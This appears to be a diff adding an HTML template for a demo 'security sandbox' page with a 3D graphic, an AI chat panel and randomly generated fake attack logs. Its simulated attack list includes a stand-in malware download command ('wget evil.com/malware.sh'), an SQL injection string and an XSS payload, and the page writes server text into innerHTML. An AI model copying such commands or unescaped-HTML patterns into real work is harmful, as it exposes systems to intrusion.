@@ -1,0 +1,392 @@
+{% extends 'base.html' %}
+{% block title %}Sovereign Sandbox | Kusmus AI{% endblock %}
+
+{% block content %}
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+
+<style>
+    /* --- GLOBAL LAYOUT & RESET --- */
+    header, footer, #chat-widget-container { display: none !important; }
+    
+    body { 
+        background-color: #000; 
+        color: #e0e0e0; 
+        font-family: 'Inter', sans-serif; 
+        overflow: hidden; 
+        height: 100vh; 
+        margin: 0; 
+    }
+
+    #canvas-container {
+        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+        z-index: 0; pointer-events: none;
+        background: radial-gradient(circle at center, #111 0%, #000 90%);
+    }
+
+    /* --- MAIN GRID --- */
+    .sandbox-grid {
+        position: relative; z-index: 10;
+        display: grid; 
+        grid-template-columns: 350px 1fr 380px; /* Slightly wider right panel for logs */
+        height: 100vh; 
+        width: 100vw;
+        overflow: hidden; 
+    }
+
+    /* --- GLASS PANELS --- */
+    .glass-panel {
+        background: rgba(5, 5, 5, 0.85);
+        backdrop-filter: blur(12px);
+        display: flex; flex-direction: column;
+        border-right: 1px solid rgba(255,255,255,0.08);
+        border-left: 1px solid rgba(255,255,255,0.08);
+        height: 100%; 
+        overflow: hidden; 
+        min-height: 0; 
+    }
+
+    /* --- SIDEBAR LEFT --- */
+    .sidebar-left { padding: 30px 20px; gap: 20px; }
+    
+    .btn-back {
+        display: flex; align-items: center; gap: 10px;
+        color: #666; text-decoration: none; font-size: 0.75rem; 
+        text-transform: uppercase; letter-spacing: 1.5px; 
+        transition: color 0.3s; margin-bottom: 20px; flex-shrink: 0;
+    }
+    .btn-back:hover { color: #fff; }
+
+    .stat-box {
+        background: rgba(255, 255, 255, 0.03);
+        border: 1px solid rgba(255, 255, 255, 0.05);
+        padding: 15px; border-radius: 6px; margin-bottom: 10px;
+        flex-shrink: 0;
+    }
+    .stat-label { font-size: 0.65rem; color: #0072ff; letter-spacing: 1px; font-weight: bold; margin-bottom: 5px; }
+    .stat-value { font-size: 1.8rem; font-weight: 700; color: #fff; font-family: 'Garamond', serif; }
+    .stat-status { font-size: 0.8rem; color: #00ff88; letter-spacing: 1px; font-weight: 600; margin-top: 5px; }
+
+    .mode-select {
+        width: 100%; background: #111; color: #0072ff; border: 1px solid #333;
+        padding: 8px; border-radius: 4px; font-size: 0.75rem; font-weight: bold;
+        outline: none; cursor: pointer; text-transform: uppercase;
+    }
+
+    /* --- COGNITIVE HUD --- */
+    .trace-terminal {
+        flex-grow: 1; margin-top: 20px;
+        background: rgba(0,0,0,0.5); border: 1px solid #222;
+        padding: 15px; font-family: 'Courier New', monospace; 
+        overflow-y: auto; font-size: 0.7rem; color: #00ff88;
+        display: flex; flex-direction: column; gap: 8px;
+        min-height: 0; 
+    }
+    .thought-line { opacity: 0; animation: fadeIn 0.3s forwards; border-left: 2px solid #0072ff; padding-left: 8px; }
+
+    /* --- CENTER CHAT --- */
+    .main-terminal { 
+        position: relative; display: flex; flex-direction: column; 
+        background: transparent; height: 100%; overflow: hidden; min-height: 0;
+    }
+    #chat-container { 
+        flex-grow: 1; overflow-y: auto; padding: 40px 10% 120px; 
+        display: flex; flex-direction: column; gap: 15px; scroll-behavior: smooth; min-height: 0; 
+    }
+    
+    .bubble { 
+        max-width: 80%; padding: 15px 20px; border-radius: 6px; 
+        font-size: 0.9rem; line-height: 1.5; overflow-wrap: break-word;
+    }
+    .ai-bubble { align-self: flex-start; background: rgba(20, 20, 20, 0.8); border: 1px solid #333; color: #ccc; border-left: 3px solid #0072ff; }
+    .user-bubble { align-self: flex-end; background: rgba(0, 114, 255, 0.8); color: #fff; border: 1px solid #005bb5; }
+
+    /* ALERT BUBBLES */
+    .system-alert-bubble {
+        align-self: center; width: 90%; background: rgba(255, 0, 0, 0.1);
+        border: 1px solid #ff4444; color: #ff4444; padding: 12px;
+        font-family: 'Courier New', monospace; font-size: 0.8rem;
+        text-align: left; border-radius: 4px; margin: 10px 0;
+        transition: all 0.5s ease;
+    }
+    .system-alert-bubble.processing {
+        background: rgba(0, 114, 255, 0.1); border-color: #0072ff; color: #0072ff;
+        animation: pulse-blue 1.5s infinite; text-align: center;
+    }
+    .system-alert-bubble.resolved {
+        background: rgba(0, 255, 136, 0.1); border-color: #00ff88; color: #00ff88; text-align: center;
+    }
+
+    @keyframes pulse-blue { 50% { box-shadow: 0 0 20px rgba(0,114,255,0.5); } }
+
+    /* INPUT AREA */
+    .input-wrapper {
+        position: absolute; bottom: 20%; left: 50%; transform: translateX(-50%);
+        width: 80%; background: rgba(0,0,0,0.9); border: 1px solid #333;
+        border-radius: 50px; padding: 15px 25px; display: flex; align-items: center; gap: 15px;
+        box-shadow: 0 10px 40px rgba(0,0,0,0.5); z-index: 20;
+    }
+    .input-wrapper input { flex: 1; background: transparent; border: none; color: #fff; outline: none; }
+    .input-wrapper button { background: none; border: none; color: #0072ff; cursor: pointer; }
+
+    /* --- SIDEBAR RIGHT (LOGS) --- */
+    .sidebar-right { 
+        padding: 20px; font-family: 'Courier New', monospace; 
+        font-size: 0.65rem; color: #666; height: 100%; overflow: hidden;
+    }
+    #activity-log { 
+        height: 100%; overflow-y: auto; display: flex; 
+        flex-direction: column-reverse; min-height: 0; gap: 4px;
+    }
+    .log-entry { padding: 4px 0; border-bottom: 1px solid #111; word-break: break-all; }
+    .log-ts { color: #444; margin-right: 5px; }
+
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .red-alert-active { border: 1px solid red; box-shadow: inset 0 0 50px rgba(255,0,0,0.2); }
+</style>
+
+<div id="canvas-container"><canvas id="three-canvas"></canvas></div>
+
+<div class="sandbox-grid">
+    <aside class="sidebar-left glass-panel">
+        <a href="/" class="btn-back"><i class="fas fa-arrow-left"></i> EXIT DEMO</a>
+        
+        <div class="stat-box">
+            <div class="stat-label">OPERATIONAL MODE</div>
+            <select id="ui-mode-toggle" class="mode-select" onchange="updateUIMode()">
+                <option value="reactive">REACTIVE (Manual)</option>
+                <option value="proactive">PROACTIVE (Auto-Mitigate)</option>
+            </select>
+        </div>
+
+        <div class="stat-box">
+            <div class="stat-label">VANGUARD SCORE</div>
+            <div class="stat-value" id="v-score">100</div>
+            <div class="stat-status" id="security-status-text">SECURED</div>
+        </div>
+
+        <div class="trace-terminal" id="cognitive-hud">
+            <div style="color: #444;">[Reasoning stream idle...]</div>
+        </div>
+    </aside>
+
+    <main class="main-terminal">
+        <div style="padding:40px; color:#ddd;">
+            <h2 style="color:#fff; margin-bottom:10px;">Select a Demo</h2>
+            <p style="color:#999; margin-bottom:20px;">Choose a live demo to launch the interactive sandbox with a 3D asset.</p>
+            <div style="display:flex; gap:12px; flex-wrap:wrap;">
+                {% for key, info in demos.items() %}
+                    <a class="secondary-button" href="{{ url_for('public.sandbox_home') }}?demo={{ key }}">{{ info.name }}</a>
+                {% endfor %}
+            </div>
+        </div>
+        <div class="input-wrapper">
+            <input type="text" id="sandbox-input" placeholder="Type command..." autocomplete="off">
+            <button onclick="sendDirective()"><i class="fas fa-paper-plane"></i></button>
+        </div>
+    </main>
+
+    <aside class="sidebar-right glass-panel">
+        <div class="stat-label" style="margin-bottom:15px; padding-bottom:10px; border-bottom:1px solid #222;">
+            LIVE FORENSIC TELEMETRY
+        </div>
+        <div id="activity-log"></div>
+    </aside>
+</div>
+
+<script>
+    // --- 1. DYNAMIC ASSET & 3D SETUP ---
+    const canvas = document.querySelector('#three-canvas');
+    const renderer = new THREE.WebGLRenderer({canvas, alpha: true, antialias: true});
+    renderer.setSize(window.innerWidth, window.innerHeight);
+    const scene = new THREE.Scene();
+    const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+    camera.position.z = 5;
+
+    scene.add(new THREE.AmbientLight(0x404040, 2));
+    const pl = new THREE.PointLight(0xffffff, 1); pl.position.set(10,10,10); scene.add(pl);
+
+    let currentMesh, isAlertState = false;
+    const urlParams = new URLSearchParams(window.location.search);
+    const rawDemo = urlParams.get('demo') || 'sentinel'; 
+    let backendDemoId = 'sentinel_monitor';
+
+    if(rawDemo === 'concierge') backendDemoId = 'strategic_concierge';
+    if(rawDemo === 'robotics') backendDemoId = 'surge_vla';
+    
+    function initAsset() {
+        let geo;
+        if(rawDemo === 'sentinel') geo = new THREE.ConeGeometry(1.5, 3, 4); 
+        else if (rawDemo === 'concierge') geo = new THREE.BoxGeometry(2, 2, 2); 
+        else if (rawDemo === 'robotics') geo = new THREE.TorusKnotGeometry(1, 0.3, 100, 16);
+        else geo = new THREE.ConeGeometry(1.5, 3, 4);
+
+        const mat = new THREE.MeshPhongMaterial({color: 0x0072ff, wireframe: true});
+        currentMesh = new THREE.Mesh(geo, mat);
+        scene.add(currentMesh);
+    }
+    initAsset();
+
+    function animate() {
+        requestAnimationFrame(animate);
+        if(currentMesh) {
+            currentMesh.rotation.y += isAlertState ? 0.05 : 0.005;
+            currentMesh.rotation.x += isAlertState ? 0.02 : 0.00;
+            currentMesh.material.color.setHex(isAlertState ? 0xff0000 : 0x0072ff);
+        }
+        renderer.render(scene, camera);
+    }
+    animate();
+
+    // --- 2. ADVANCED TELEMETRY GENERATOR ---
+    let logBuffer = [], currentMode = 'reactive';
+    function updateUIMode() { currentMode = document.getElementById('ui-mode-toggle').value; }
+
+    const ATTACK_VECTORS = [
+        { type: "SQL Injection", sig: "UNION SELECT 1,2,3--", severity: "CRITICAL" },
+        { type: "Brute Force", sig: "Failed Login (Root) x50", severity: "WARNING" },
+        { type: "RCE Attempt", sig: "/bin/sh execution via HTTP", severity: "CRITICAL" },
+        { type: "XSS Payload", sig: "<script>alert(1)<\/script>", severity: "WARNING" },
+        { type: "DDoS Spike", sig: "High SYN Flood Detected", severity: "CRITICAL" },
+        { type: "Privilege Escalation", sig: "sudo -l exploit attempt", severity: "CRITICAL" },
+        { type: "Malware Download", sig: "wget evil.com/malware.sh", severity: "CRITICAL" },
+        { type: "Data Exfiltration", sig: "Large outbound data transfer", severity: "CRITICAL" },
+        { type: "Port Scan", sig: "Multiple ports probed from single IP", severity: "INFO" },
+        { type: "Phishing Attempt", sig: "Suspicious email link clicked", severity: "WARNING" },
+        { type: "Zero-Day Exploit", sig: "Unknown vulnerability exploited", severity: "CRITICAL" }
+    ];
+
+    const SUSPICIOUS_IPS = ["192.168.45.12", "10.0.5.99", "45.33.22.11", "203.0.113.5", "192.168.45.13", "10.0.5.100", "192.168.45.14", "192.168.45.15"];
+    const INTERNAL_IPS = ["10.5.1.20", "10.5.1.21", "10.5.1.22", "10.5.1.23", "10.5.1.24", "10.5.1.25", "10.5.1.26"];
+
+    function generateForensicLog() {
+        const now = new Date();
+        const ts = `[${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}]`;
+        const isAttack = Math.random() > 0.85 && !isAlertState; // 15% chance of attack
+
+        if (isAttack) {
+            const vector = ATTACK_VECTORS[Math.floor(Math.random() * ATTACK_VECTORS.length)];
+            const src = SUSPICIOUS_IPS[Math.floor(Math.random() * SUSPICIOUS_IPS.length)];
+            const dest = INTERNAL_IPS[Math.floor(Math.random() * INTERNAL_IPS.length)];
+            
+            return {
+                text: `${ts} [${vector.severity}] SRC:${src} -> DEST:${dest} | SIG: ${vector.sig} | VECTOR: ${vector.type}`,
+                isCrit: true,
+                severity: vector.severity
+            };
+        } else {
+            const latency = Math.floor(Math.random() * 30) + 10;
+            return {
+                text: `${ts} [INFO] Heartbeat: ${latency}ms | Packet Loss: 0% | Active Threads: ${Math.floor(Math.random()*50)+20}`,
+                isCrit: false,
+                severity: "INFO"
+            };
+        }
+    }
+
+    setInterval(() => {
+        const logData = generateForensicLog();
+        
+        // Update DOM
+        const div = document.createElement('div');
+        div.className = 'log-entry';
+        div.innerHTML = `<span class="log-ts">${logData.text.split('] ')[0]}]</span> ${logData.text.split('] ')[1] || logData.text}`;
+        div.style.color = logData.isCrit ? '#ff4444' : '#666';
+        
+        const logArea = document.getElementById('activity-log');
+        logArea.prepend(div);
+        if(logArea.childNodes.length > 50) logArea.removeChild(logArea.lastChild);
+
+        // Update Buffer
+        logBuffer.push(logData.text);
+        if(logBuffer.length > 25) logBuffer.shift();
+
+        // Trigger Alert State
+        if(logData.isCrit && logData.severity === "CRITICAL" && !isAlertState) {
+            isAlertState = true;
+            document.querySelector('.main-terminal').classList.add('red-alert-active');
+            
+            if(currentMode === 'proactive') {
+                sendDirective(`[SYSTEM_ALERT] ${logData.text}`);
+            }
+        }
+    }, 3000);
+
+    // --- 3. CHAT & CORE LOGIC ---
+    async function sendDirective(overrideMsg = null) {
+        const input = document.getElementById('sandbox-input');
+        const text = overrideMsg || input.value.trim();
+        if(!text) return;
+
+        let sysId = null;
+        if(!overrideMsg) {
+            appendBubble(text, 'user');
+            input.value = '';
+        } else {
+            sysId = 'sys-' + Date.now();
+            // Pass the raw log text into the bubble for forensic clarity
+            appendBubble(`<i class="fas fa-shield-alt"></i> VANGUARD TRIGGER:<br>${text}`, 'system-alert', sysId);
+            setTimeout(() => {
+                const el = document.getElementById(sysId);
+                if(el) { el.classList.add('processing'); el.innerHTML = `<i class="fas fa-cog fa-spin"></i> ANALYZING ATTACK VECTOR...`; }
+            }, 800);
+        }
+
+        const loadingId = 'loading-' + Date.now();
+        if(!overrideMsg) appendBubble('...', 'ai', loadingId);
+
+        try {
+            const res = await fetch('/api/sandbox/chat', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    message: text, 
+                    demo_id: backendDemoId, 
+                    context_logs: logBuffer
+                })
+            });
+            const data = await res.json();
+            
+            if(document.getElementById(loadingId)) document.getElementById(loadingId).remove();
+
+            if(sysId) {
+                const el = document.getElementById(sysId);
+                if(el) { el.classList.remove('processing'); el.classList.add('resolved'); el.innerHTML = `<i class="fas fa-check-circle"></i> THREAT MITIGATED`; }
+            }
+
+            appendBubble(data.response, 'ai');
+            if(data.v_score) document.getElementById('v-score').innerText = data.v_score;
+            if(data.status) document.getElementById('security-status-text').innerText = data.status;
+            
+            const hud = document.getElementById('cognitive-hud'); hud.innerHTML = '';
+            if(data.thought_trace) {
+                data.thought_trace.forEach(thought => {
+                    const t = document.createElement('div'); t.className = 'thought-line'; t.innerText = thought; hud.appendChild(t);
+                });
+            }
+
+            if(data.response.includes("SUCCESS") || data.response.includes("Mitigated") || data.v_score > 80) {
+                isAlertState = false;
+                document.querySelector('.main-terminal').classList.remove('red-alert-active');
+            }
+
+        } catch(e) { console.error(e); }
+    }
+
+    function appendBubble(html, type, id=null) {
+        const div = document.createElement('div');
+        div.className = type === 'system-alert' ? 'system-alert-bubble' : `bubble ${type}-bubble`;
+        div.innerHTML = html; if(id) div.id = id;
+        const container = document.getElementById('chat-container');
+        container.appendChild(div);
+        container.scrollTop = container.scrollHeight;
+    }
+
+    document.getElementById('sandbox-input').addEventListener('keypress', (e) => { if(e.key === 'Enter') sendDirective(); });
+    
+    window.addEventListener('resize', () => {
+        camera.aspect = window.innerWidth / window.innerHeight;
+        camera.updateProjectionMatrix();
+        renderer.setSize(window.innerWidth, window.innerHeight);
+    });
+</script>
+{% endblock %}
